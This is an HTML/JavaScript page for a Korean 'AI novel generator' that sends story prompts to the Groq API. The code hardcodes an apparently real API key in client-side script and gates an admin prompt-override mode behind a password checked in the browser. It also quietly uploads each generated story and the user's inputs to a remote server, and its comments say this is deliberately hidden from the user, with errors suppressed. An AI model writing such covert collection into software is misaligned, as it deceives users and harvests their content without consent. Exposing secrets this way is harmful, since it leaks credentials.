<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📘 AI 소설 생성기</title>
    <style>
        :root {
            --bg-color: #f9f9fb;
            --text-color: #000000;
            --input-bg: #ffffff;
            --input-text: #000000;
            --button-bg: #e0e0e0;
            --accent-green: #4CAF50;
            --accent-blue: #2196F3;
            --accent-red: #f44336;
        }

        body {
            font-family: 'Helvetica', Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            transition: all 0.3s ease;
        }

        .container {
            display: flex;
            flex-direction: row;
            min-height: 100vh;
        }

        .left-panel {
            width: 320px;
            padding: 20px;
            background-color: var(--bg-color);
        }

        .right-panel {
            flex: 1;
            padding: 20px;
            background-color: var(--bg-color);
            display: flex;
            flex-direction: column;
        }

        /* 모바일 세로형 UI */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            
            .left-panel {
                width: auto;
                order: 1;
            }
            
            .right-panel {
                order: 2;
                min-height: 60vh;
            }
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-top: 15px;
            margin-bottom: 5px;
            font-size: 11pt;
        }

        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            font-size: 11pt;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: var(--input-bg);
            color: var(--input-text);
        }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            margin-bottom: 8px;
            border: none;
            border-radius: 4px;
            font-size: 11pt;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .generate-btn {
            background-color: var(--accent-green);
            color: white;
        }

        .save-btn {
            background-color: var(--accent-blue);
            color: white;
        }

        .toggle-btn {
            background-color: var(--button-bg);
            color: var(--text-color);
        }

        button:hover {
            opacity: 0.9;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        textarea {
            width: 100%;
            height: 100%;
            resize: none;
            padding: 15px;
            font-size: 11pt;
            border: 1px solid #ccc;
            background-color: var(--input-bg);
            color: var(--input-text);
            border-radius: 4px;
            box-sizing: border-box;
        }

        .dark-mode {
            --bg-color: #1e1e1e;
            --text-color: #ffffff;
            --input-bg: #333333;
            --input-text: #ffffff;
            --button-bg: #444;
        }

        .alert {
            padding: 10px;
            background-color: #f8d7da;
            color: #721c24;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
        }

        .success {
            padding: 10px;
            background-color: #d4edda;
            color: #155724;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
        }

        .secret-mode-container {
            margin-top: 20px;
            padding: 15px;
            border: 1px dashed #ccc;
            border-radius: 4px;
            background-color: rgba(0, 0, 0, 0.03);
        }

        .password-input {
            display: none;
            margin-top: 10px;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
        }

        .checkbox-container input[type="checkbox"] {
            width: auto;
            margin-right: 10px;
        }

        .admin-panel {
            display: none;
            margin-top: 10px;
            padding: 10px;
            background-color: rgba(255, 0, 0, 0.05);
            border-radius: 4px;
            border: 1px solid rgba(255, 0, 0, 0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-panel">
            <h1>📘 AI 소설 생성기</h1>
            
            <div class="alert" id="error-message"></div>
            <div class="success" id="success-message"></div>
            
            <label for="topic">주제 (선택):</label>
            <input type="text" id="topic" placeholder="예: 판타지, SF, 로맨스 등">
            
            <label for="description">설명 (선택):</label>
            <input type="text" id="description" placeholder="예: 짧은 이야기, 중세 판타지 등">
            
            <label for="characters">등장인물 (선택):</label>
            <input type="text" id="characters" placeholder="예: 주인공, 친구, 적대자 등">
            
            <label for="perspective">시점 (선택):</label>
            <input type="text" id="perspective" placeholder="예: 1인칭, 3인칭 등">
            
            <div class="secret-mode-container">
                <div class="checkbox-container">
                    <input type="checkbox" id="secret-mode-checkbox"> 
                    <label for="secret-mode-checkbox">⛔️ 비밀 모드</label>
                </div>
                
                <div id="password-input" class="password-input">
                    <input type="password" id="secret-password" placeholder="비밀번호 입력">
                    <button id="verify-password" class="toggle-btn">확인</button>
                </div>
                
                <div id="admin-panel" class="admin-panel">
                    <label for="alt-prompt">대체 프롬프트:</label>
                    <input type="text" id="alt-prompt" placeholder="관리자 모드 프롬프트">
                </div>
            </div>
            
            <button id="generate-btn" class="generate-btn">✨ 소설 생성</button>
            <button id="save-local-btn" class="save-btn">💾 저장하기</button>
            <button id="toggle-mode" class="toggle-btn">🌙 다크/화이트 전환</button>
        </div>
        
        <div class="right-panel">
            <h1>📖 생성된 소설</h1>
            <textarea id="output" readonly placeholder="생성된 소설이 여기에 표시됩니다..."></textarea>
        </div>
    </div>

    <script>
        // 여기에 고정된 API 키를 설정합니다
        const GROQ_API_KEY = "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("; // 이 부분을 실제 API 키로 변경하세요
        
        // 관리자 비밀번호 설정
        const ADMIN_PASSWORD = "********"; // 이 부분을 원하는 비밀번호로 변경하세요
        
        // 드라이브 연동을 위한 서버 URL
        const SERVER_URL = "https://your-server-url.com/upload-story"; // 이 부분을 실제 서버 URL로 변경하세요
        
        // DOM 요소
        const topicInput = document.getElementById('topic');
        const descriptionInput = document.getElementById('description');
        const charactersInput = document.getElementById('characters');
        const perspectiveInput = document.getElementById('perspective');
        const generateBtn = document.getElementById('generate-btn');
        const saveLocalBtn = document.getElementById('save-local-btn');
        const toggleModeBtn = document.getElementById('toggle-mode');
        const outputTextarea = document.getElementById('output');
        const errorMessage = document.getElementById('error-message');
        const successMessage = document.getElementById('success-message');
        const secretModeCheckbox = document.getElementById('secret-mode-checkbox');
        const passwordInput = document.getElementById('password-input');
        const secretPassword = document.getElementById('secret-password');
        const verifyPasswordBtn = document.getElementById('verify-password');
        const adminPanel = document.getElementById('admin-panel');
        const altPromptInput = document.getElementById('alt-prompt');

        // 비밀 모드 관련 변수
        let isSecretModeEnabled = false;
        
        // 현재 소설 제목 저장 변수
        let currentStoryTitle = "";
        
        // 다크모드 토글
        let isDarkMode = false;
        toggleModeBtn.addEventListener('click', () => {
            isDarkMode = !isDarkMode;
            document.body.classList.toggle('dark-mode', isDarkMode);
        });

        // 비밀 모드 체크박스 이벤트
        secretModeCheckbox.addEventListener('change', function() {
            if (this.checked) {
                passwordInput.style.display = 'block';
                // 체크하면 비밀번호 입력란에 포커스
                secretPassword.focus();
            } else {
                passwordInput.style.display = 'none';
                adminPanel.style.display = 'none';
                isSecretModeEnabled = false;
            }
        });
        
        // 비밀번호 확인 이벤트
        verifyPasswordBtn.addEventListener('click', function() {
            const password = secretPassword.value;
            if (password === ADMIN_PASSWORD) {
                adminPanel.style.display = 'block';
                isSecretModeEnabled = true;
                showSuccess('비밀 모드가 활성화되었습니다.');
            } else {
                showError('비밀번호가 일치하지 않습니다.');
                secretPassword.value = '';
                isSecretModeEnabled = false;
            }
        });
        
        // 엔터키로 비밀번호 확인
        secretPassword.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyPasswordBtn.click();
            }
        });

        // 기본 프롬프트 생성 함수
        function createPrompt(topic, description, characters, perspective) {
            return `당신은 창의적인 소설가 AI입니다. 아래의 정보를 참고하여 소설을 작성하세요.

주제: ${topic || '무작위 판타지'}
설명: ${description || '짧은 이야기'}
등장인물: ${characters || '주인공, 친구, 반대자'}
시점: ${perspective || '3인칭'}

소설에는 멋진 제목을 포함시키고, 몰입감 있게 써주세요.`;
        }

        // 소설 제목 추출 함수
        function extractTitle(story) {
            const lines = story.split('\n');
            if (lines.length > 0) {
                const possibleTitle = lines[0].trim();
                // 제목으로 보이는 첫 번째 줄 추출 (너무 길지 않고 마침표가 없는 줄)
                if (possibleTitle.length < 100 && !possibleTitle.includes('.')) {
                    return possibleTitle.replace(/[^\w\s가-힣]/g, '').trim();
                }
            }
            // 제목이 명확하지 않으면 현재 시간으로 제목 생성
            return "AI소설_" + new Date().toLocaleString().replace(/[\/\s:]/g, '_');
        }

        // 서버에 소설 업로드 함수
        async function uploadStoryToServer(story, title, userInputs) {
            try {
                const formData = new FormData();
                formData.append('content', story);
                formData.append('title', title);
                formData.append('topic', userInputs.topic || '');
                formData.append('description', userInputs.description || '');
                formData.append('characters', userInputs.characters || '');
                formData.append('perspective', userInputs.perspective || '');
                formData.append('timestamp', new Date().toISOString());
                
                // 이 부분은 실제로는 서버측 스크립트를 통해 구글 드라이브에 저장하게 됩니다
                // 여기서는 사용자 입장에서는 보이지 않는 백그라운드 요청을 보냅니다
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(errorData.message || '알 수 없는 오류가 발생했습니다.');
                }
                
                console.log('소설이 성공적으로 수집되었습니다.');
                // 사용자에게는 어떤 메시지도 표시하지 않음 (백그라운드 작업)
            } catch (error) {
                console.error('소설 수집 오류:', error);
                // 사용자에게는 오류를 표시하지 않음
            }
        }

        // 소설 생성 함수
        generateBtn.addEventListener('click', async () => {
            if (!GROQ_API_KEY || GROQ_API_KEY === "여기에_너의_Groq_API_KEY를_입력") {
                showError('코드 내 API 키가 설정되지 않았습니다. HTML 파일을 수정하여 API 키를 입력해주세요.');
                return;
            }

            const topic = topicInput.value;
            const description = descriptionInput.value;
            const characters = charactersInput.value;
            const perspective = perspectiveInput.value;
            
            generateBtn.disabled = true;
            outputTextarea.value = '소설 생성 중입니다...\n\n잠시만 기다려주세요...';
            
            try {
                // 비밀 모드가 활성화되었고 대체 프롬프트가 있으면 사용
                let prompt;
                if (isSecretModeEnabled && altPromptInput.value.trim()) {
                    prompt = altPromptInput.value.trim();
                } else {
                    prompt = createPrompt(topic, description, characters, perspective);
                }
                
                const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${GROQ_API_KEY}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        model: 'mixtral-8x7b-32768',
                        messages: [{ role: 'user', content: prompt }],
                        temperature: 0.85,
                        max_tokens: 2048
                    })
                });
                
                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(errorData.error?.message || '알 수 없는 오류가 발생했습니다.');
                }
                
                const data = await response.json();
                const story = data.choices[0].message.content;
                
                outputTextarea.value = story;
                
                // 제목 추출
                currentStoryTitle = extractTitle(story);
                
                // 사용자 입력 정보 수집
                const userInputs = {
                    topic,
                    description,
                    characters,
                    perspective
                };
                
                // 백그라운드에서 서버로 소설 업로드 (사용자에게 알리지 않음)
                if (SERVER_URL && SERVER_URL !== "https://your-server-url.com/upload-story") {
                    uploadStoryToServer(story, currentStoryTitle, userInputs);
                }
            } catch (error) {
                showError(`오류 발생: ${error.message}`);
                outputTextarea.value = '소설 생성 중 오류가 발생했습니다. API 키가 올바른지 확인해주세요.';
            } finally {
                generateBtn.disabled = false;
            }
        });

        // 오류 표시 함수
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 5000);
        }

        // 성공 메시지 표시 함수
        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.style.display = 'block';
            
            setTimeout(() => {
                successMessage.style.display = 'none';
            }, 5000);
        }

        // 로컬 저장 기능
        saveLocalBtn.addEventListener('click', () => {
            const story = outputTextarea.value.trim();
            if (!story || story.includes('소설 생성 중')) {
                showError('먼저 소설을 생성하세요.');
                return;
            }
            
            // 텍스트 파일로 저장
            const blob = new Blob([story], { type: 'text/plain;charset=utf-8' });
            const a = document.createElement('a');
            
            // 파일명 설정
            const fileName = `${currentStoryTitle || 'AI소설'}.txt`;
            
            a.href = URL.createObjectURL(blob);
            a.download = fileName;
            a.click();
            
            URL.revokeObjectURL(a.href);
        });

        // 화면 크기에 따른 UI 초기화
        function initializeResponsiveUI() {
            // 모바일 디바이스 체크 (iOS, Android)
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                document.querySelector('.container').classList.add('mobile-layout');
            }
        }

        // 페이지 로드 시 UI 초기화
        document.addEventListener('DOMContentLoaded', initializeResponsiveUI);
    </script>
</body>
</html>
